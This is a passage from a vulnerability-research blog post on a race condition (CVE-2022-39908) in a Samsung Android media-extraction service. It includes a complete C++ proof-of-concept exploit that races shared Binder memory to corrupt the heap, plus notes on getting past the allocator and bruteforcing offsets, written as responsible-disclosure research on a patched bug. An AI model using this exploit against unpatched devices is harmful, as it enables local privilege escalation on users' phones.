to the transaction <code>BpMemoryHeap::assertReallyMapped()</code>. The latter will query info about the memory again such as the size, the offset, etc, from the sharing process. Most importantly it will retrieve a file descriptor, which as we evoked <a href=#what>previously</a>, is one of the special objects the Binder driver can natively transfer. This file descriptor will be <code>duped</code>, then <code>mmaped</code> to constitute the receiving process&rsquo; actual access to the shared memory. The base pointer, size, offset, etc, are then checked and set as class attributes at once.</p><p>An actual implementation of the service is <code>MemoryHeapBase</code>, located in <code>frameworks/native/libs/binder/MemoryHeapBase.cpp</code>. In this class, the sharing process side gets the original file descriptor for the shared memory by resorting to the <code>memfd_create()</code> syscall, which creates a volatile anonymous file living in the RAM.</p><p>If we leave the implementation files and read the header for the <code>IMemory</code> interface in the file <code>frameworks/native/libs/binder/include/binder/IMemory.h</code>, we notice this commentary:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cpp data-lang=cpp><span style=display:flex><span>  <span style=color:#75715e>// Accessing the underlying pointer must be done with caution, as there are
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  <span style=color:#75715e>// some inherent security risks associated with it. When receiving an
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  <span style=color:#75715e>// IMemory from an untrusted process, there is currently no way to guarantee
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  <span style=color:#75715e>// that this process would&#39;t change the content after the fact. This may
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  <span style=color:#75715e>// lead to TOC/TOU class of security bugs. In most cases, when performance
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  <span style=color:#75715e>// is not an issue, the recommended practice is to immediately copy the
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  <span style=color:#75715e>// buffer upon reception, then work with the copy, e.g.:
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  <span style=color:#75715e>//
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  <span style=color:#75715e>// std::string private_copy(mem.size(), &#39;\0&#39;);
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  <span style=color:#75715e>// memcpy(private_copy.data(), mem.unsecurePointer(), mem.size());
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  <span style=color:#75715e>//
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  <span style=color:#75715e>// In cases where performance is an issue, this matter must be addressed on
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  <span style=color:#75715e>// an ad-hoc basis.
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  <span style=color:#66d9ef>void</span><span style=color:#f92672>*</span> <span style=color:#a6e22e>unsecurePointer</span>() <span style=color:#66d9ef>const</span>;
</span></span></code></pre></div><p>Well, now that is interesting, thank you for the instructions! The mention of &ldquo;inherent security risks&rdquo; is indeed coherent with what we have just learned. If the shared memory region comes from a &ldquo;file&rdquo; that is simultaneously accessible in both the client and server processes, <strong>both of them could modify it at the same time</strong>! Moreover, if you remember the service functions that form the preamble to <code>SthmbcAdapter::decode</code>, there is no such thing as a private copy performed, so we need to see whether it is possible to leverage this behavior. Here is the beginning of the <code>SthmbcAdapter::decode</code> from the previous bug again, but in a slightly longer version this time:</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cpp data-lang=cpp><span style=display:flex><span>sp<span style=color:#f92672>&lt;</span>IMemory<span style=color:#f92672>&gt;*</span> SthmbcAdapter<span style=color:#f92672>::</span>decode(SecVideoFrame<span style=color:#f92672>*</span> secVideoFrame) {
</span></span><span style=display:flex><span>  <span style=color:#75715e>// In the following code we&#39;re showing secVideoFrame as if it were an uint_32_t array
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  <span style=color:#66d9ef>uint32_t</span> size <span style=color:#f92672>=</span> secVideoFrame[<span style=color:#ae81ff>9</span>] <span style=color:#f92672>+</span> secVideoFrame[<span style=color:#ae81ff>10</span>] <span style=color:#f92672>+</span> <span style=color:#ae81ff>44</span>; <span style=color:#75715e>// [1]
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  <span style=color:#66d9ef>uint32_t</span> control <span style=color:#f92672>=</span> secVideoFrame[<span style=color:#ae81ff>5</span>];
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>if</span> (control <span style=color:#f92672>&lt;=</span> <span style=color:#ae81ff>107</span>) {
</span></span><span style=display:flex><span>    size <span style=color:#f92672>*=</span> <span style=color:#ae81ff>2</span>;
</span></span><span style=display:flex><span>  }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>uint32_t</span> heapBufferSize <span style=color:#f92672>=</span> size <span style=color:#f92672>+</span> <span style=color:#ae81ff>32</span>;
</span></span><span style=display:flex><span>  <span style=color:#75715e>// The size of heapBuffer depends on secVideoFrame[10]
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  <span style=color:#66d9ef>char</span><span style=color:#f92672>*</span> heapBuffer <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> <span style=color:#66d9ef>char</span>[heapBufferSize];
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>if</span> (<span style=color:#f92672>!</span>heapBuffer) {
</span></span><span style=display:flex><span>    <span style=color:#75715e>// Error path [...]
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  }
</span></span><span style=display:flex><span>  memset(heapBuffer, <span style=color:#ae81ff>0</span>, heapBufferSize);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>uint32_t</span> length <span style=color:#f92672>=</span> secVideoFrame[<span style=color:#ae81ff>10</span>]; <span style=color:#75715e>// [2] Reading again secVideoFrame[10]!
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  <span style=color:#66d9ef>if</span> (<span style=color:#f92672>!</span>length) {
</span></span><span style=display:flex><span>    <span style=color:#75715e>// Error path [...]
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  }
</span></span><span style=display:flex><span>  <span style=color:#75715e>// Potentially large and long memcpy
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  memcpy(heapBuffer, secVideoFrame <span style=color:#f92672>+</span> secVideoFrame[<span style=color:#ae81ff>9</span>] <span style=color:#f92672>+</span> <span style=color:#ae81ff>44</span>, length); <span style=color:#75715e>// [3]
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>uint32_t</span> offset <span style=color:#f92672>=</span> secVideoFrame[<span style=color:#ae81ff>10</span>]; <span style=color:#75715e>// [4] Reading again secVideoFrame[10]!
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  <span style=color:#66d9ef>if</span> (<span style=color:#ae81ff>122</span> <span style=color:#f92672>&lt;</span> control) {
</span></span><span style=display:flex><span>    memcpy(heapBuffer <span style=color:#f92672>+</span> offset, secVideoFrame[<span style=color:#ae81ff>11</span>], secVideoFrame[<span style=color:#ae81ff>9</span>]); <span style=color:#75715e>// [5]
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
</span></span><span style=display:flex><span>    <span style=color:#75715e>// [...]
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>uint32_t</span> check <span style=color:#f92672>=</span> secVideoFrame[<span style=color:#ae81ff>0</span>] <span style=color:#f92672>&amp;</span> <span style=color:#ae81ff>0xFFFFFFFE</span>;
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>if</span> (check <span style=color:#f92672>!=</span> <span style=color:#ae81ff>200</span> <span style=color:#f92672>||</span> check <span style=color:#f92672>!=</span> <span style=color:#ae81ff>500</span>) { <span style=color:#75715e>// [6]
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>      <span style=color:#75715e>// Error path [...]
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    }
</span></span><span style=display:flex><span>  }
</span></span><span style=display:flex><span>  <span style=color:#75715e>// Much more code [...]
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>}
</span></span></code></pre></div><p>All-in-all it seems that things are nicely arranged for a potential attacker: after first being read at <em>[1]</em> to compute the <code>heapBuffer</code> size, <code>secVideoFrame[10]</code> is read again at <em>[4]</em> and then used as an offset for the destination of the <code>memcpy</code> in <em>[5]</em>. Since we can concurrently change its value between the time of the two reads, we&rsquo;re able to point the destination pointer wherever we want. We have no real constraints on <code>secVideoFrame[9]</code> and <code>secVideoFrame[11]</code> either, so it is possible to take control of the <code>memcpy</code> to perform an arbitrary relative write!</p><p>We may also cause the checks at <em>[6]</em> to be failed on purpose in order to take the convenient error path, and have an early <code>return</code> just after the corruption happened. The first <code>memcpy</code> at <em>[3]</em> is an extra blessing for the malicious actor: giving it a large <code>length</code> will make it take some time to complete, enough to flip the value of <code>secVideoFrame[10]</code>. It could however turn out to be a minor drawback since the value of <code>secVideoFrame[10]</code> is also read at <em>[2]</em>, and if the value was already changed at this time, the code at <em>[3]</em> will likely largely overflow and crash the service process before we have a chance to perform the corruption.</p><p>Here is a simple PoC I wrote to test this suggested attack pattern (note that you would need a local AOSP 10 image to build it):</p><div class=highlight><pre tabindex=0 style=color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-cpp data-lang=cpp><span style=display:flex><span><span style=color:#75715e>#define LOG_TAG &#34;CVE-2022-39908&#34; </span><span style=color:#75715e>// logcat
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
</span></span><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;atomic&gt;</span><span style=color:#75715e>
</span></span></span><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;binder/IServiceManager.h&gt;</span><span style=color:#75715e>
</span></span></span><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;binder/MemoryBase.h&gt;</span><span style=color:#75715e>
</span></span></span><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;binder/MemoryHeapBase.h&gt;</span><span style=color:#75715e>
</span></span></span><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;binder/Parcel.h&gt;</span><span style=color:#75715e>
</span></span></span><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;log/log.h&gt;</span><span style=color:#75715e>
</span></span></span><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;media/IMediaExtractorService.h&gt;</span><span style=color:#75715e>
</span></span></span><span style=display:flex><span><span style=color:#75715e>#include</span> <span style=color:#75715e>&lt;thread&gt;</span><span style=color:#75715e>
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>using</span> <span style=color:#66d9ef>namespace</span> android;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e>// Global variable used for synchronizing exit
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>std<span style=color:#f92672>::</span>atomic<span style=color:#f92672>&lt;</span><span style=color:#66d9ef>bool</span><span style=color:#f92672>&gt;</span> gEnd(false);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#75715e>// The goal of this function is
</span></span></span><span style=display:flex><span><span style=color:#75715e>// to constantly exchange 2 uint32_t values at a given address
</span></span></span><span style=display:flex><span><span style=color:#75715e></span><span style=color:#66d9ef>void</span> <span style=color:#a6e22e>thread_flip</span>(<span style=color:#66d9ef>uint32_t</span> <span style=color:#f92672>*</span>target, <span style=color:#66d9ef>uint32_t</span> val0, <span style=color:#66d9ef>uint32_t</span> val1) {
</span></span><span style=display:flex><span>  <span style=color:#75715e>// We use very small sleeps between the writings
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  <span style=color:#66d9ef>struct</span> <span style=color:#a6e22e>timespec</span> req;
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>struct</span> <span style=color:#a6e22e>timespec</span> rem;
</span></span><span style=display:flex><span>  req.tv_sec <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>;
</span></span><span style=display:flex><span>  req.tv_nsec <span style=color:#f92672>=</span> <span style=color:#ae81ff>1</span>;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>while</span> (true) {
</span></span><span style=display:flex><span>    <span style=color:#75715e>// Clean exit
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    <span style=color:#66d9ef>if</span> (gEnd.load(std<span style=color:#f92672>::</span>memory_order_acquire)) {
</span></span><span style=display:flex><span>      <span style=color:#66d9ef>return</span>;
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>    <span style=color:#75715e>// Always checking gEnd might slow the flip
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>    <span style=color:#66d9ef>for</span> (<span style=color:#66d9ef>int</span> i <span style=color:#f92672>=</span> <span style=color:#ae81ff>0</span>; i <span style=color:#f92672>&lt;</span> <span style=color:#ae81ff>1000</span>; i<span style=color:#f92672>++</span>) {
</span></span><span style=display:flex><span>      memcpy(target, <span style=color:#f92672>&amp;</span>val0, <span style=color:#ae81ff>4</span>);
</span></span><span style=display:flex><span>      nanosleep(<span style=color:#f92672>&amp;</span>req, <span style=color:#f92672>&amp;</span>rem);
</span></span><span style=display:flex><span>      memcpy(target, <span style=color:#f92672>&amp;</span>val1, <span style=color:#ae81ff>4</span>);
</span></span><span style=display:flex><span>      nanosleep(<span style=color:#f92672>&amp;</span>req, <span style=color:#f92672>&amp;</span>rem);
</span></span><span style=display:flex><span>    }
</span></span><span style=display:flex><span>  }
</span></span><span style=display:flex><span>}
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span><span style=color:#66d9ef>int</span> <span style=color:#a6e22e>main</span>(<span style=color:#66d9ef>int</span> argc, <span style=color:#66d9ef>char</span> <span style=color:#f92672>**</span>argv) {
</span></span><span style=display:flex><span>  ALOGI(<span style=color:#e6db74>&#34;Started&#34;</span>);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  <span style=color:#75715e>// This program expects as an argument, in hexadecimal,
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  <span style=color:#75715e>// the offset from the vulnerable heap at which we want to write
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  <span style=color:#66d9ef>if</span> (argc <span style=color:#f92672>&lt;</span> <span style=color:#ae81ff>2</span>) {
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>return</span> <span style=color:#f92672>-</span><span style=color:#ae81ff>1</span>;
</span></span><span style=display:flex><span>  }
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>uint32_t</span> offset <span style=color:#f92672>=</span> std<span style=color:#f92672>::</span>stoul(argv[<span style=color:#ae81ff>1</span>], <span style=color:#66d9ef>nullptr</span>, <span style=color:#ae81ff>16</span>);
</span></span><span style=display:flex><span>  ALOGI(<span style=color:#e6db74>&#34;Using offset 0x%.8x&#34;</span>, offset);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>uint32_t</span> secVideoFrame_5 <span style=color:#f92672>=</span> <span style=color:#ae81ff>123</span>; <span style=color:#75715e>// Value to trigger the target execution flow
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  <span style=color:#66d9ef>uint32_t</span> secVideoFrame_9 <span style=color:#f92672>=</span> <span style=color:#ae81ff>4</span>; <span style=color:#75715e>// Size of our write
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  <span style=color:#75715e>// &#34;Normal&#34; offset targeted for computing the heap length
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  <span style=color:#75715e>// It is chosen huge to bypass Scudo
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  <span style=color:#66d9ef>uint32_t</span> secVideoFrame_10_0 <span style=color:#f92672>=</span> <span style=color:#ae81ff>0x10000</span>;
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>uint32_t</span> secVideoFrame_10_1 <span style=color:#f92672>=</span> offset;
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>uint32_t</span> secVideoFrame_11 <span style=color:#f92672>=</span> <span style=color:#ae81ff>0x12345678</span>; <span style=color:#75715e>// What we&#39;re writing
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  size_t secVideoFrame_size <span style=color:#f92672>=</span> <span style=color:#ae81ff>0x100000</span>; <span style=color:#75715e>// More than secVideoFrame_10_0
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>
</span></span><span style=display:flex><span>  sp<span style=color:#f92672>&lt;</span>IMemoryHeap<span style=color:#f92672>&gt;</span> memoryHeap <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> MemoryHeapBase(
</span></span><span style=display:flex><span>    secVideoFrame_size, <span style=color:#ae81ff>0</span>, <span style=color:#e6db74>&#34;CVE-2022-39908&#34;</span>);
</span></span><span style=display:flex><span>  LOG_ALWAYS_FATAL_IF(memoryHeap <span style=color:#f92672>==</span> NULL, <span style=color:#e6db74>&#34;IMemoryHeap creation failed&#34;</span>);
</span></span><span style=display:flex><span>  sp<span style=color:#f92672>&lt;</span>IMemory<span style=color:#f92672>&gt;</span> memory <span style=color:#f92672>=</span> <span style=color:#66d9ef>new</span> MemoryBase(memoryHeap, <span style=color:#ae81ff>0</span>, secVideoFrame_size);
</span></span><span style=display:flex><span>  LOG_ALWAYS_FATAL_IF(memory <span style=color:#f92672>==</span> NULL, <span style=color:#e6db74>&#34;IMemory creation failed&#34;</span>);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>uint32_t</span> <span style=color:#f92672>*</span>secVideoFrame_pointer <span style=color:#f92672>=</span> (<span style=color:#66d9ef>uint32_t</span> <span style=color:#f92672>*</span>)memory<span style=color:#f92672>-&gt;</span>pointer();
</span></span><span style=display:flex><span>  <span style=color:#75715e>// Filling at least secVideoFrame_pointer[0] with 0s
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  <span style=color:#75715e>// triggers the targeted early exit
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  memset(secVideoFrame_pointer, <span style=color:#ae81ff>0</span>, secVideoFrame_size);
</span></span><span style=display:flex><span>  secVideoFrame_pointer[<span style=color:#ae81ff>5</span>] <span style=color:#f92672>=</span> secVideoFrame_5;
</span></span><span style=display:flex><span>  secVideoFrame_pointer[<span style=color:#ae81ff>9</span>] <span style=color:#f92672>=</span> secVideoFrame_9;
</span></span><span style=display:flex><span>  secVideoFrame_pointer[<span style=color:#ae81ff>10</span>] <span style=color:#f92672>=</span> secVideoFrame_10_0;
</span></span><span style=display:flex><span>  secVideoFrame_pointer[<span style=color:#ae81ff>11</span>] <span style=color:#f92672>=</span> secVideoFrame_11;
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  <span style=color:#75715e>// Retrieve the media.extractor service from the service manager
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  sp<span style=color:#f92672>&lt;</span>IMediaExtractorService<span style=color:#f92672>&gt;</span> mediaExtractorService;
</span></span><span style=display:flex><span>  status_t getServiceStatus <span style=color:#f92672>=</span> getService(String16(<span style=color:#e6db74>&#34;media.extractor&#34;</span>), <span style=color:#f92672>&amp;</span>mediaExtractorService);
</span></span><span style=display:flex><span>  LOG_ALWAYS_FATAL_IF(getServiceStatus <span style=color:#f92672>!=</span> OK,
</span></span><span style=display:flex><span>    <span style=color:#e6db74>&#34;Could not get a handle on IMediaExtractorService&#34;</span>);
</span></span><span style=display:flex><span>  sp<span style=color:#f92672>&lt;</span>IBinder<span style=color:#f92672>&gt;</span> mediaExtractorServiceAsBinder <span style=color:#f92672>=</span> IMediaExtractor<span style=color:#f92672>::</span>asBinder(mediaExtractorService);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  Parcel data, reply;
</span></span><span style=display:flex><span>  data.writeInterfaceToken(mediaExtractorService<span style=color:#f92672>-&gt;</span>descriptor);
</span></span><span style=display:flex><span>  data.writeStrongBinder(IMemory<span style=color:#f92672>::</span>asBinder(memory));
</span></span><span style=display:flex><span>  <span style=color:#75715e>// We start the constant exchange of secVideoFrame_10 value,
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  <span style=color:#75715e>// on a dedicated thread running in parallel of the transaction, which is synchronous
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  std<span style=color:#f92672>::</span><span style=color:#66d9ef>thread</span> threadFlip <span style=color:#f92672>=</span> std<span style=color:#f92672>::</span><span style=color:#66d9ef>thread</span>(
</span></span><span style=display:flex><span>    thread_flip, <span style=color:#f92672>&amp;</span>secVideoFrame_pointer[<span style=color:#ae81ff>10</span>], secVideoFrame_10_0, secVideoFrame_10_1);
</span></span><span style=display:flex><span>  <span style=color:#75715e>// Here the transaction number is 6 in the Galaxy J6, but it might vary on other models
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  status_t transactStatus <span style=color:#f92672>=</span> mediaExtractorServiceAsBinder<span style=color:#f92672>-&gt;</span>transact(<span style=color:#ae81ff>6</span>, data, <span style=color:#f92672>&amp;</span>reply);
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>switch</span> (transactStatus) {
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>case</span> OK:
</span></span><span style=display:flex><span>    ALOGI(<span style=color:#e6db74>&#34;Transaction finished with expected ok status&#34;</span>);
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>break</span>;
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>case</span> DEAD_OBJECT:
</span></span><span style=display:flex><span>    ALOGI(<span style=color:#e6db74>&#34;Transaction finished with expected broken pipe status (media.extractor likely crashed)&#34;</span>);
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>break</span>;
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>default</span><span style=color:#f92672>:</span>
</span></span><span style=display:flex><span>    ALOGI(<span style=color:#e6db74>&#34;Transaction finished with unexpected error status: %s&#34;</span>, strerror(<span style=color:#f92672>-</span><span style=color:#ae81ff>1</span> <span style=color:#f92672>*</span> transactStatus));
</span></span><span style=display:flex><span>    <span style=color:#66d9ef>break</span>;
</span></span><span style=display:flex><span>  }
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  <span style=color:#75715e>// Clean exit
</span></span></span><span style=display:flex><span><span style=color:#75715e></span>  gEnd.store(true, std<span style=color:#f92672>::</span>memory_order_release);
</span></span><span style=display:flex><span>  threadFlip.join();
</span></span><span style=display:flex><span>
</span></span><span style=display:flex><span>  ALOGI(<span style=color:#e6db74>&#34;Terminated successfully&#34;</span>);
</span></span><span style=display:flex><span>  <span style=color:#66d9ef>return</span> <span style=color:#ae81ff>0</span>;
</span></span><span style=display:flex><span>}
</span></span></code></pre></div><p>Since we only have a relative write primitive, you need to give an offset for the PoC. I cheated a bit in order to test it, and leaked the address of <code>heapBuffer</code> and the saved return address on the stack with <code>gdb</code>. It allowed me to hijack the execution flow, but let&rsquo;s try to see if it is doable for an attacker to grab a good offset without a leak.</p><p>The Scudo allocator that we showed in the previous bug is our first problem. It owns a ton of small memory regions that are intertwined with the libraries mappings, and <code>heapBuffer</code> could be allocated on any one of these at random.</p><p><figure style=margin-top:1em;margin-bottom:1em><a href=/posts/img/samsung-system-services/scudo.png target=_blank><img src=/posts/img/samsung-system-services/scudo.png alt="Extract of Scudo Primary memory mappings"></a><figcaption style=font-weight:400;font-style:italic;margin-top:1em>Some of the Scudo heap zones in our target process</figcaption></figure></p><p>As Scudo is a part of the LLVM project, we should have a look at the <a href=https://www.llvm.org/docs/ScudoHardenedAllocator.html>LLVM documentation</a> to see if we can avoid this:</p><blockquote><p>The allocator combines several components that serve distinct purposes:</p><ul><li>the Primary allocator: fast and efficient, it services smaller allocation sizes by carving reserved memory regions into blocks of identical size. There are currently two Primary allocators implemented, specific to 32 and 64 bit architectures. It is configurable via compile time options.</li><li>the Secondary allocator: slower, it services larger allocation sizes via the memory mapping primitives of the underlying operating system. Secondary backed allocations are surrounded by Guard Pages. It is also configurable via compile time options.</li><li>[&mldr;]</li></ul></blockquote><p>That&rsquo;s great, we just need to make <code>heapBuffer</code> bigger to fallback to the system allocator! We just have to adjust the value <code>secVideoFrame_10</code>. The needed value depends on Scudo&rsquo;s consideration, here a value of <code>0x10000</code> was sufficient on a <em>J6</em> (so the PoC shown in this article is already tuned to reach this behavior).</p><p>Now that we have secured a less random base for our offset, what is our destination? Since we&rsquo;re performing the <code>memcpy</code> in the middle of a transaction, we have a high chance to not be on <code>media.extractor</code>&rsquo;s main thread but on a dedicated thread from this process&rsquo; Binder pool. In addition, <code>media.extractor</code> is not exactly Android&rsquo;s busiest service, so we can bet on being in the 1st <code>media.extractor</code> Binder thread. I ran some experiments and it seems that on a <em>J6</em>, the entropy of the offset between our heap buffer and our target thread&rsquo;s saved return address is &ldquo;only&rdquo; of 12 bits. We&rsquo;re also dealing with a system service so if we get a wrong offset and trigger a crash, the service should automatically be restarted, leaving the door open for bruteforce! The main issue we could encounter would be <a href=https://source.android.com/docs/core/tests/debug/rescue-party>Rescue Party</a> spying on the health of <code>media.extractor</code>, which would limit our attempts to 5 in 30 seconds. Even with such a limit we should succeed in the bruteforce within a few hours of trying. Well, I didn&rsquo;t actually try to push the exploitation to this point, but it doesn&rsquo;t seem too unrealistic!</p><h2 id=responsible-disclosure>Responsible Disclosure</h2><p>I confirmed that the vulnerabilities were at least also present on a <em>J6+</em>, and looking at a few other firmwares it seemed that many other models were affected. As a consequence, I sent a report on August 22 to Samsung. They assessed the bugs and the corrections landed in the <a href="https://security.samsungmobile.com/securityUpdate.smsb?year=2022&amp;month=12">December 22 security patch</a>. I even got a bounty reward by the end of December!</p><p>I learned two things when the patch notes came. The first was that even through I worked on an old phone, the vulnerabilities were still present on the newest Samsung Android version:</p><blockquote><p>Affected versions: Q(10) and R(11) OS with libsadapter, S(12) and T(13) OS with libsthmbcadapter</p></blockquote><p>The second is that the vulnerable transaction was actually a decoder for video thumbnails! The funny thing here is that since we fuzzed all the system services regardless, we only had to care about the target interface transaction code and arguments without bothering about the context.</p><blockquote><p>SVE-2022-2078(CVE-2022-39908, CVE-2022-39907): Heap overflow vulnerabilities in Samsung decoding library for video thumbnails</p></blockquote><h1 id=conclusion>Conclusion</h1><p>I&rsquo;m grateful to Thalium for offering me the opportunity to delve into this subject. It was both an insightful and a fun experience, and I surely learned a lot of things. The original idea for this internship came from Guillaume TEISSIER, my supervisor. I would like to thank him for being so supportive of this work, and for all his good advice!</p><p>The discovered CVEs are not the most impressive in terms of exploitability, however they were present in a wide range of smartphone models. On their own they would classify as small LPEs, and that&rsquo;s actually the kind of primitive we would expect to find in system services: for a malevolent actor, they would have their place as part of a broader chain.</p><p>The understanding of the vulnerabilities relied on many Binder concepts that we detailed in the first part of this article, such as the interface references or the modification of AOSP services by the manufacturer. I&rsquo;m very certainly biased, but I believe this supports the validity of our target, and of our approach trying to take into account all of the Binder nuances.</p></div><footer class=post-footer><div class=post-footer-data><div class=tags><div class=tag><a href=/tags/android>#Android</a></div><div class=tag><a href=/tags/cve>#CVE</a></div><div class=tag><a href=/tags/fuzzing>#Fuzzing</a></div><div class=tag><a href=/tags/vulnerability-research>#Vulnerability Research</a></div></div><span class=date>2023-04-20
<span class=author>by
Anthony REMY</span></span></div></footer></article><footer><div class=social-links-footer><a href=mailto:contact@thalium.re><div class=social-link>Email</div></a><a href=https://github.com/thalium target=_blank><div class=social-link>GitHub</div></a><a href=https://twitter.com/thalium_team target=_blank><div class=social-link>Twitter</div></a></div><div class=copyright>Copyright (c) 2020, all rights reserved.</div><div class=poweredby>Powered by <a href=https://gohugo.io/>Hugo</a>.</div></footer></div></body></html>